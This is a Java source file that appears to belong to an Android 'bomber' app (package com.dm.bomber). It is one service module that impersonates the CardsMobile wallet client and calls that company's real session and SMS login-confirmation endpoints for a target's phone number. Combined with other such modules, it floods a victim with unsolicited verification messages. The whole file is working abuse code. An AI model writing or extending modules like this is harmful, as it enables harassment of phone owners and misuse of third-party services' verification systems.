package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class CardsMobile extends Service {

    @Override
    public void run(Callback callback) {
        JSONObject json = new JSONObject();
        JSONObject application = new JSONObject();

        try {
            application.put("applicationName", "ru.cardsmobile.mw3");
            application.put("applicationVersion", "7.40.2");
            application.put("gsonDiscriminator", "com.cardsmobile.aaa.api.AndroidMobileWallet");
            application.put("secured", true);

            json.put("application", application);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        client.newCall(new Request.Builder()
                .url("https://service-a.cardsmobile.ru/aaa/session/")
                .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                .build()).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                callback.onFailure(call, e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                try {
                    JSONObject json = new JSONObject(response.body().string());

                    client.newCall(new Request.Builder()
                            .url("https://service-a.cardsmobile.ru/aaa/session/" +
                                    json.getJSONObject("sessionOptions")
                                            .getString("sessionId")
                                    + "/account/login/confirmation/msisdn/request")
                            .post(RequestBody.create(getFormattedPhone(), MediaType.parse("application/json")))
                            .build()).enqueue(callback);
                } catch (JSONException e) {
                    callback.onResponse(call, response);
                }
            }
        });
    }
}
